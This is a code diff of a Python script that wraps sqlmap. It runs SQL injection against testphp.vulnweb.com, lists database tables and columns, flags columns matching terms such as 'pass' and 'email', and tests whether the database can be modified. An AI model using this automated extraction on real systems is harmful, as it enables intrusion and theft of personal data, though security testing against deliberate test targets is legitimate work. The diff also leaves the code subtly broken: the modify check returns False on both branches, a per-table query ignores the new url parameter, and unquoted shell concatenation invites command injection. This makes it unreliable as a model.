@@ -5,36 +5,35 @@ import re
 import sys
 
 def checkForUnallowedQuery(tableDef: tableDefinition.TableDefinition, blacklist: list[str]):
-    for columnIndex in range(len(tableDef.columns)):
-        for blacklistElementIndex in range(len(blacklist)):
-            if tableDef.columns[columnIndex].lower().find(blacklist[blacklistElementIndex].lower()) != -1:
+    for columnIndex in range(len(tableDef.columns)):                #look through columns
+        for blacklistElementIndex in range(len(blacklist)):         #loop through blacklist
+            if tableDef.columns[columnIndex].lower().find(blacklist[blacklistElementIndex].lower()) != -1:  #look for similarity
                 return tableDefinition.QueryRequest(True, tableDef.columns[columnIndex],
-                                                    blacklist[blacklistElementIndex], tableDef.name, tableDef.databaseName)
+                                                    blacklist[blacklistElementIndex], tableDef.name, tableDef.databaseName)         #return relevant data
 
     return tableDefinition.QueryRequest(False, tableDef.columns[columnIndex],
-                                        blacklist[blacklistElementIndex], tableDef.name, tableDef.databaseName)
+                                        blacklist[blacklistElementIndex], tableDef.name, tableDef.databaseName)                     #return relevant data
 
-def Init():
+def Init(url):
     Queryflag = False
     Modifyflag = False
     blacklist = ["phone", "pass", "address", "email"]
     # blacklist = ["SUB_PART","DATA_LENGTH"]
 
-    url = "http://testphp.vulnweb.com/artists.php?artist=1"
     command = "sqlmap --url="
 
-    result = subprocess.run(command + url + " --batch --tables --threads=5", shell=True, stdin=subprocess.PIPE, capture_output=True)
+    result = subprocess.run(command + url + " --batch --tables --threads=5", shell=True, stdin=subprocess.PIPE, capture_output=True)    #run default request
 
 
-    tables_request = str(result.stdout.decode())
+    tables_request = str(result.stdout.decode())            #get request result
     tables_request = str.split(tables_request, '\n') #array where the items are each line of the output of the query
 
 
     tableDefinitions = list[tableDefinition.TableDefinition]()
     dbName = ""
     areaMarkerCount = 0
-    for x in range(len(tables_request)):
-
+    for x in range(len(tables_request)):        #loop through result
+        #parse and store data obtained
         if tables_request[x].find("+---") != -1 and tables_request[x].find("---+") != -1:
             dbName = tables_request[x - 2]
             dbName = dbName.replace("Database: ", "")
@@ -47,28 +46,29 @@ def Init():
             tempString = tempString.replace("\r", "")
             tempString = tempString.replace("\n", "")
             tempString = tempString.strip()
-            tempDefinition = tableDefinition.TableDefinition(tempString, dbName)
+            tempDefinition = tableDefinition.TableDefinition(tempString, dbName)   #create new table definition object with table data
             tableDefinitions.append(tempDefinition)
-    #        print("From table: " + tempDefinition.name)
 
 
 
-    for x in range(len(tableDefinitions)):
+    for x in range(len(tableDefinitions)):      #loop through table data
         #print(tableDefinitions[x].databaseName)
         #print(tableDefinitions[x].name)
         result = subprocess.run(
             "sqlmap -u \"http://testphp.vulnweb.com/artists.php?artist=1\" --threads=5 --sql-query=\"select * from " +
             tableDefinitions[x].databaseName + "." + tableDefinitions[x].name + "\"",
-            shell=True, stdin=subprocess.PIPE, capture_output=True)
+            shell=True, stdin=subprocess.PIPE, capture_output=True)             #request all columns
         queryResult = result.stdout.decode()
         # print(queryResult)
         queryResult = str.split(queryResult, "\n")
         focusLine = ""
 
-        for y in range(len(queryResult)):
+        for y in range(len(queryResult)):           #parse request
+            #read data
             if queryResult[y].find("the query with expanded column name(s) is:") != -1:
                 focusLine = queryResult[y]
 
+        #store data
         focusLine = focusLine[focusLine.find("SELECT") + 6: focusLine.find("FROM")]
         columnNames = str.split(focusLine, ",")
         for z in range(len(columnNames)):
@@ -88,7 +88,6 @@ def Init():
             querydecode = str(result.stdout.decode())
             querydecode = str.split(querydecode, "\n")
             check = ""
-            print("poopoopoo")
 
             for p in range(len(querydecode)):
                 if querydecode[p].find("select " + queryCheck.columnName + " from " + queryCheck.db + "." +queryCheck.table) != -1:
@@ -107,14 +106,12 @@ def Init():
             modifydecode = result.stdout.decode()
             modifydecode = str.split(modifydecode, "\n")
             checkmodify = ""
-            print("poopoo")
 
             for a in range(len(modifydecode)):
                 if modifydecode[a].find("execution of non-query SQL statements is only available when stacked queries are supported") != -1:
-                    print("poo")
                     Modifyflag = False
                 else:
-                    Modifyflag = True
+                    Modifyflag = False
             break
 
     return (Modifyflag, Queryflag)
